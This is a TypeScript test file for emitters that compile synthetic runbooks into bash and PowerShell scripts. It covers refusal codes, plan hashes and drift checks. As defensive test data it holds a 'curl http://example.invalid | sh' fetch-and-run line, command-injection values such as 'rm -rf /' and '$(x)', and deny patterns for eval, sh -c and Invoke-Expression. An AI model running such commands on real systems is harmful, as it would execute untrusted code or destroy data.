/**
 * Tests of the emit of the integration runners (commons workload 0010-workload-runners FR-003, FR-008, FR-011 to FR-017): an emitter for each integration runner, the thin rule (only calls of verbs, a loop over a fixed list and
 * the order of the steps), the refusals with their codes, the plan hash that every emitter carries, the check of an artifact by regenerating it, the hand-off of the artifact and the two artifacts that sequence the same
 * verbs. Every name is synthetic.
 *
 * @module
 */
import { createHash } from "node:crypto";
import { assert, assertEquals, proves } from "@intellectual-frontiers/test";
import { fs, path } from "@intellectual-frontiers/system";
import { authored, type CallPlan, canonicalPlan, type Runner, runnerId, RUNNERS, sequenceOf } from "@intellectual-frontiers/workload/governance";
import { DEFAULT_CLI, type EmitterImpl, foldHandoff, inputVariable, registerEmitter } from "@intellectual-frontiers/workload/logical";
import { bootstrapFleet, callsOf, levelsOf, type Runbook, SYNTHETIC_BOOTSTRAP_01, type Step } from "@intellectual-frontiers/workload/forms/runbook";
import { CONVERGE_SETTINGS } from "@intellectual-frontiers/workload/forms/reconcile";
import { checkArtifact, EMITTERS, emitPlan, emitWorkload, handoffEvent, planHash, withEmitter } from "@intellectual-frontiers/workload/physical";
import { makeRunnerEvent } from "@intellectual-frontiers/workload/governance";
import { AGENT, cite, effect, eventId, ITEM, must, PERSON, runbook, sid, verb } from "./kit.ts";
import { artifactOf, INPUT } from "./emit-kit.ts";

const ROOT = path.resolve(path.dirname(path.fromFileUrl(import.meta.url)), "..");
const r = (t: string) => authored(runnerId(t));
const PLAN = (): CallPlan => must(callsOf(SYNTHETIC_BOOTSTRAP_01, INPUT));
const head = (id: string) => ({ id: sid(id), title: id, spec: [cite] });
const claim = verb("claim", "work.claim", effect("synthetic-vault-01", "durable", "append"), { order: { kind: "literal", value: "o" } });

const codes = async (steps: readonly Step[], over: Partial<Runbook> = {}, fleet: typeof bootstrapFleet = bootstrapFleet): Promise<readonly string[]> => {
  const made = await emitWorkload(runbook(steps, over), r("bash"), { fleet });
  return made.kind === "ok" ? ["ok"] : made.error.map((f) => f.code);
};

/** The calls an artifact makes, read from its text: the step, the verb and the member of the loop, in order. */
const callsIn = (kind: "bash" | "pwsh", text: string): readonly string[] => {
  const re = kind === "bash" ? /run_verb '([^']+)' '([^']+)'(?: .*--member "\$\{member\}")?/u : /Invoke-Verb -Step '([^']+)' -Verb '([^']+)'/u;
  const out: string[] = [];
  let members: string[] = [];
  for (const line of text.split("\n")) {
    const m = kind === "bash" ? /^members=\((.*)\)$/u.exec(line) : /foreach \(\$member in @\((.*)\)\)/u.exec(line);
    if (m !== null) members = [...(m[1] ?? "").matchAll(/'([^']*)'/gu)].map((x) => x[1] ?? "");
    const c = re.exec(line);
    if (c === null || line.trimStart().startsWith("#") || line.includes("run_verb()") || line.includes("function")) continue;
    if (line.includes("--member")) for (const mem of members) out.push(`${c[1]} ${c[2]} ${mem}`);
    else out.push(`${c[1]} ${c[2]}`);
  }
  return out;
};

proves(["0010-workload-runners FR-003"], "each integration runner has an emitter that compiles the plan into an artifact and hands it off, and the native runner has none", async () => {
  assertEquals(EMITTERS.map((e) => e.runner.id).sort(), RUNNERS.list().filter((x) => x.kind === "integration").map((x) => x.id).sort());
  for (const id of ["bash", "pwsh"]) {
    const made = await emitWorkload(SYNTHETIC_BOOTSTRAP_01, r(id), INPUT);
    assert(made.kind === "ok" && made.value.text.length > 100 && made.value.workload === "synthetic-bootstrap-01");
    assertEquals(made.value.path, `synthetic-bootstrap-01.${id === "bash" ? "sh" : "ps1"}`);
  }
  const native = await emitWorkload(SYNTHETIC_BOOTSTRAP_01, r("native"), INPUT);
  assert(native.kind === "err" && native.error[0]?.code === "E-WL-RUNNER-UNSUITABLE" && native.error[0].message.includes("no emitter"));
  const mine: EmitterImpl = { runner: { id: r("minimal-runner"), kind: "integration", title: "A minimal runner", capabilities: ["calls"] } as Runner, extension: "txt", render: (plan, hash) => `${plan.workload} ${hash}\n` };
  assertEquals(registerEmitter(EMITTERS, mine).kind, "err", "it is not in the registry of runners");
  const more = must((await import("@intellectual-frontiers/workload/governance")).createRunnerRegistry([...RUNNERS.list(), mine.runner]));
  const added = must(registerEmitter(EMITTERS, mine, more));
  assertEquals(added.length, 3);
  assertEquals(registerEmitter(added, mine, more).kind, "err", "an emitter twice");
  assertEquals(registerEmitter(EMITTERS, { ...mine, runner: RUNNERS.get("native") as Runner }, more).kind, "err", "the native runner has none");
  assertEquals(withEmitter(mine, more).kind, "ok");
  const custom = must(await emitPlan(PLAN(), r("minimal-runner"), {}, added));
  assert(custom.text.startsWith("synthetic-bootstrap-01 "));
});

proves(["0010-workload-runners FR-008"], "the autonomy derived for each step is carried in the artifact unchanged, and is the autonomy the runbook derives whatever the runner", async () => {
  const expected = new Map(levelsOf(SYNTHETIC_BOOTSTRAP_01).map((l) => [String(l.id), `${l.kind === "each" ? "each over hosts" : l.kind}, ${l.autonomy}`]));
  for (const id of ["bash", "pwsh"] as const) {
    const a = await artifactOf(id);
    const seen = [...a.text.matchAll(/# step ([a-z0-9-]+): (.+)$/gmu)].map((m) => [m[1] ?? "", m[2] ?? ""] as const);
    assertEquals(seen.map(([s]) => s), ["install-check", "claim-order", "record-hosts", "record-host"], id);
    for (const [step, said] of seen) assertEquals(said, expected.get(step), `${id} ${step}`);
  }
  assertEquals((await artifactOf("bash")).plan, (await artifactOf("pwsh")).plan);
});

proves(["0010-workload-runners FR-011", "0008-form-runbook FR-023"], "an artifact is only calls of verbs by id, a loop over a fixed list and the order of the steps; a step outside the subset is refused with its code", async () => {
  const bash = (await artifactOf("bash")).text;
  const pwsh = (await artifactOf("pwsh")).text;
  for (const bad of [/\beval\b/u, /\$\(/u, /`/u, /\bsource\b/u, /^\s*\.\s/mu, /\bexec\b/u, /\bsh -c\b/u]) assert(!bad.test(bash), `bash ${String(bad)}`);
  for (const bad of [/Invoke-Expression/iu, /\biex\b/iu, /Start-Process/iu, /^\s*\.\s/mu, /\$\(/u, /\bAdd-Type\b/u]) assert(!bad.test(pwsh), `pwsh ${String(bad)}`);
  const bashBody = bash.slice(bash.indexOf("# step install-check")).split("\n").filter((l) => l.trim() !== "" && !l.trim().startsWith("#"));
  for (const line of bashBody) assert(/^( {2})?run_verb '[a-z0-9-]+' '[a-z0-9.-]+'( --in ('[^']*'|"[a-z-]+=\$\{WORKLOAD_INPUT_[A-Z0-9_]+\}"))*( --member "\$\{member\}")?$|^members=\(('[^']*'( |))*\)$|^for member in "\$\{members\[@\]\}"; do$|^done$|^current_step='done'$/u.test(line), line);
  const pwshBody = pwsh.slice(pwsh.indexOf("try {"), pwsh.indexOf("catch {")).split("\n").filter((l) => l.trim() !== "" && !l.trim().startsWith("#"));
  for (const line of pwshBody) assert(/^\s*(try \{|\}|Invoke-Verb -Step '[a-z0-9-]+' -Verb '[a-z0-9.-]+' -VerbArguments @\(.*\)|foreach \(\$member in @\(('[^']*'(, )?)*\)\) \{|\$script:CurrentStep = 'done')$/u.test(line), line);
  // what a script cannot carry
  const ask: Step = { ...head("ask-person"), kind: "ask", question: "May it go on?", approver: "synthetic-approver-01", deadlineHours: 24 };
  const judge: Step = { ...head("think"), kind: "judge", question: "What now?", output: { answer: { kind: "text" } } };
  const branch: Step = { ...head("choose"), kind: "branch", on: sid("think"), output: "answer", equals: "yes", then: [], otherwise: [] };
  const gate: Step = { ...head("approve"), kind: "gate", action: "approve", approver: "synthetic-approver-01", demands: "agent-proposes", guards: [sid("late")] };
  const late = verb("late", "work.claim", effect("synthetic-vault-01", "durable", "append"), { order: { kind: "literal", value: "o" } });
  assert((await codes([claim, ask])).includes("E-WL-RUNNER-EMIT-UNSUPPORTED"), (await codes([claim, ask])).join());
  assert((await codes([judge])).includes("E-WL-RUNNER-EMIT-UNSUPPORTED"), (await codes([judge])).join());
  assert((await codes([judge, branch])).includes("E-WL-RUNNER-EMIT-UNSUPPORTED"), (await codes([judge, branch])).join());
  assert((await codes([gate, late])).includes("E-WL-RUNNER-EMIT-UNSUPPORTED"), (await codes([gate, late])).join());
  const undo: Step = { ...head("take-back"), kind: "undo", compensates: sid("claim"), verb: (claim as Extract<Step, { kind: "verb" }>).verb, inputs: { order: { kind: "literal", value: "o" } }, effect: effect("synthetic-vault-01", "durable", "append") };
  assert((await codes([claim, undo])).includes("E-WL-RUNNER-EMIT-UNSUPPORTED"), (await codes([claim, undo])).join());
  const reads = verb("reads", "work.record", effect("synthetic-vault-01", "durable", "append"), { order: { kind: "output", step: sid("claim"), name: "order" } });
  assert((await codes([claim, reads])).includes("E-WL-RUNNER-EMIT-UNSUPPORTED"), (await codes([claim, reads])).join());
  const nested: Step = { ...head("outer"), kind: "each", over: "hosts", source: { kind: "literal", value: "synthetic-bootstrap-hosts" }, body: [{ ...head("inner"), kind: "each", over: "hosts", source: { kind: "literal", value: "synthetic-bootstrap-hosts" }, body: [claim] }] };
  assert((await codes([nested])).includes("E-WL-RUNNER-EMIT-UNSUPPORTED"), (await codes([nested])).join());
  assertEquals(await codes([claim]), ["ok"]);
  const loop = await emitWorkload(CONVERGE_SETTINGS, r("pwsh"), INPUT);
  assert(loop.kind === "err" && loop.error[0]?.code === "E-WL-RUNNER-EMIT-UNSUPPORTED");
  assertEquals(callsOf(SYNTHETIC_BOOTSTRAP_01, INPUT).kind, "ok");
  assertEquals((await artifactOf("bash")).text.includes("SYNTHETIC_TOKEN_01"), true);
  assert(!/SYNTHETIC_TOKEN_01=/u.test(bash) && !/SYNTHETIC_TOKEN_01\s*=/u.test(pwsh) && !/\$env:SYNTHETIC/iu.test(pwsh));
});

proves(["0010-workload-runners FR-012"], "a value that is not printable ASCII is refused with its code, and an each needs a literal source naming a list the caller gave", async () => {
  const withValue = (text: string) => verb("claim", "work.claim", effect("synthetic-vault-01", "durable", "append"), { order: { kind: "literal", value: text } });
  assertEquals(await codes([withValue("plain value")]), ["ok"]);
  for (const bad of ["a\nb", "tab\there", "café", "‘quoted’", "nul\u0000", "del\u007f"]) assert((await codes([withValue(bad)])).includes("E-WL-RUNNER-VALUE-UNSAFE"), JSON.stringify(bad));
  const each = (source: Extract<Step, { kind: "each" }>["source"]): Step => ({ ...head("fan"), kind: "each", over: "hosts", source, body: [claim] });
  assertEquals(await codes([each({ kind: "literal", value: "synthetic-bootstrap-hosts" })]), ["ok"]);
  assert((await codes([each({ kind: "input", name: "hosts" })], { inputs: [{ name: "hosts", type: "text", required: true }] })).includes("E-WL-RUNNER-EACH-UNLISTED"));
  assert((await codes([each({ kind: "literal", value: "another-list" })])).includes("E-WL-RUNNER-EACH-UNLISTED"));
  assert((await codes([each({ kind: "literal", value: "synthetic-bootstrap-hosts" })], {}, () => ["synthetic-host-01", "sp aceé"])).includes("E-WL-RUNNER-VALUE-UNSAFE"));
  assertEquals(await codes([each({ kind: "literal", value: "an-empty-list" })], {}, () => []), ["ok"]);
  const plan = PLAN();
  const unsafe = (p: CallPlan, cli?: string) => emitPlan(p, r("bash"), cli === undefined ? {} : { cli });
  assert((await unsafe(plan, "work load; rm")).kind === "err");
  assert((await unsafe(plan, "$(x)")).kind === "err");
  assertEquals((await unsafe(plan, DEFAULT_CLI)).kind, "ok");
  const first = plan.steps[0];
  assert(first?.kind === "call");
  assert((await unsafe({ ...plan, steps: [{ ...first, args: [{ name: 'o"rder', value: { kind: "literal", text: "x" } }] }] })).kind === "err", "a name of an argument that could end a quote");
  assert((await unsafe({ ...plan, steps: [{ ...first, step: "Not A Step" }] })).kind === "err");
  assert((await unsafe({ ...plan, steps: [{ ...first, verb: "rm -rf /" }] })).kind === "err");
  assert((await unsafe({ ...plan, credentials: ["X;Y"] })).kind === "err");
  assertEquals(inputVariable("order"), "WORKLOAD_INPUT_ORDER");
  assertEquals(inputVariable("a-b-c"), "WORKLOAD_INPUT_A_B_C");
});

proves(["0010-workload-runners FR-013"], "the plan hash is the SHA-256 of the canonical text of the plan, the same for every emitter, another for a changed plan, and the artifact and the hand-off carry it", async () => {
  const bash = await artifactOf("bash");
  const pwsh = await artifactOf("pwsh");
  assertEquals(bash.hash, pwsh.hash);
  assertEquals(bash.hash, createHash("sha256").update(canonicalPlan(PLAN())).digest("hex"));
  assertEquals(bash.hash, await planHash(PLAN()));
  assert(bash.text.includes(`# plan: ${bash.hash}\n`) && pwsh.text.includes(`# plan: ${bash.hash}\n`));
  assert(bash.text.includes(`readonly plan_hash='${bash.hash}'`) && pwsh.text.includes(`$PlanHash = '${bash.hash}'`));
  const changed = must(callsOf({ ...SYNTHETIC_BOOTSTRAP_01, version: "0.2.0" }, INPUT));
  assert((await planHash(changed)) !== bash.hash);
  const other = must(await emitWorkload({ ...SYNTHETIC_BOOTSTRAP_01, steps: SYNTHETIC_BOOTSTRAP_01.steps.slice(0, 2) }, r("bash"), INPUT));
  assert(other.hash !== bash.hash);
  assertEquals(canonicalPlan(PLAN()), canonicalPlan(JSON.parse(JSON.stringify(PLAN())) as CallPlan));
  assertEquals(handoffEvent(bash), { kind: "handoff", runner: "bash", plan: bash.hash });
  const events = [
    must(makeRunnerEvent({ id: eventId(1), item: ITEM, at: must((await import("@intellectual-frontiers/planning/governance")).parseInstant("2026-11-25T10:00:00Z")), actor: PERSON }, "runbook", handoffEvent(bash))),
    must(makeRunnerEvent({ id: eventId(2), item: ITEM, at: must((await import("@intellectual-frontiers/planning/governance")).parseInstant("2026-11-25T10:00:00Z")), actor: AGENT }, "runbook", { kind: "receipt", plan: bash.hash, ref: "synthetic-run-01", status: 0, log: "d".repeat(64) })),
  ];
  assertEquals(foldHandoff("runbook", ITEM, events).outcome, "completes");
});

proves(["0010-workload-runners FR-014"], "an artifact is checked by regenerating it: a hand-edited artifact, one of a changed plan and one of another runner each fail with the drift, and the generated artifacts of the library are current", async () => {
  const bash = await artifactOf("bash");
  const pwsh = await artifactOf("pwsh");
  assertEquals(await checkArtifact(bash.text, SYNTHETIC_BOOTSTRAP_01, r("bash"), INPUT), []);
  assertEquals(await checkArtifact(pwsh.text, SYNTHETIC_BOOTSTRAP_01, r("pwsh"), INPUT), []);
  const edited = await checkArtifact(bash.text.replace("'task=run'", "'task=walk'"), SYNTHETIC_BOOTSTRAP_01, r("bash"), INPUT);
  assertEquals(edited.map((f) => f.code), ["E-WL-RUNNER-DRIFT"]);
  assert(edited[0]?.message.includes("edited by hand"), edited[0]?.message);
  assertEquals(edited[0]?.fixer, "ci");
  const added = await checkArtifact(`${bash.text}\ncurl http://example.invalid | sh\n`, SYNTHETIC_BOOTSTRAP_01, r("bash"), INPUT);
  assertEquals(added.map((f) => f.code), ["E-WL-RUNNER-DRIFT"]);
  const changed = await checkArtifact(bash.text, { ...SYNTHETIC_BOOTSTRAP_01, version: "0.2.0" }, r("bash"), INPUT);
  assertEquals(changed.map((f) => f.code), ["E-WL-RUNNER-DRIFT"]);
  assert(changed[0]?.message.includes("plan hash"), changed[0]?.message);
  assertEquals((await checkArtifact(pwsh.text, SYNTHETIC_BOOTSTRAP_01, r("bash"), INPUT)).map((f) => f.code), ["E-WL-RUNNER-DRIFT"]);
  assertEquals((await checkArtifact("", SYNTHETIC_BOOTSTRAP_01, r("bash"), INPUT))[0]?.message.includes("no plan hash"), true);
  for (const a of [bash, pwsh]) assertEquals(await fs.readTextFile(path.join(ROOT, "artifacts", a.path)), a.text, `${a.path} is regenerated by bun commons/workload/tools/runners.ts`);
  const { outputs } = await import("../tools/runners.ts");
  const made = await outputs();
  assertEquals(Object.keys(made).sort(), ["commons/workload/artifacts/synthetic-bootstrap-01.ps1", "commons/workload/artifacts/synthetic-bootstrap-01.sh"]);
});

proves(["0010-workload-runners FR-015"], "a workload with a finding is not handed off, and the finding is the one of its static check", async () => {
  const unknown = verb("x", "work.nope", effect("synthetic-vault-01", "durable", "append"), {});
  const made = await codes([unknown]);
  assert(made.includes("E-WL-VERB-UNKNOWN"), made.join(","));
  assertEquals(await codes([]), ["E-RB-RUNBOOK-MALFORMED"]);
});

proves(["0010-workload-runners FR-016"], "each emitter is an instance that imports no other emitter, and an emitter imports only the core and the shared logical layer by package name", async () => {
  for (const [id, other] of [["bash", "pwsh"], ["pwsh", "bash"]] as const) {
    const text = (await fs.readTextFile(path.join(ROOT, "src", "physical", "runners", id, "mod.ts"))).replace(/\/\*\*[\s\S]*?\*\//gu, "");
    assert(!text.includes(`runners/${other}`) && !text.includes(`/${other}/`), `${id} names ${other}`);
    for (const m of text.matchAll(/from "([^"]+)"/gu)) assert(/^@intellectual-frontiers\/(core|workload\/(governance|logical))$/u.test(m[1] ?? ""), `${id}: ${m[1]}`);
  }
  for (const e of EMITTERS) assertEquals(e.runner.kind, "integration");
});

proves(["0010-workload-runners FR-017", "0012-runner-powershell FR-008"], "the bootstrap runbook is emitted to both artifacts, and the two sequence the same verbs in the same order with the same members", async () => {
  const expected = ["install-check workbench.ready", "claim-order work.claim", "record-host work.record synthetic-host-01", "record-host work.record synthetic-host-02"];
  const bash = await artifactOf("bash");
  const pwsh = await artifactOf("pwsh");
  assertEquals(callsIn("bash", bash.text), expected);
  assertEquals(callsIn("pwsh", pwsh.text), expected);
  assertEquals(sequenceOf(bash.plan).map((c) => `${c.step} ${c.verb}${c.member === undefined ? "" : ` ${c.member}`}`), expected);
  assertEquals(SYNTHETIC_BOOTSTRAP_01.steps.map((s) => s.kind), ["check", "verb", "each"]);
});
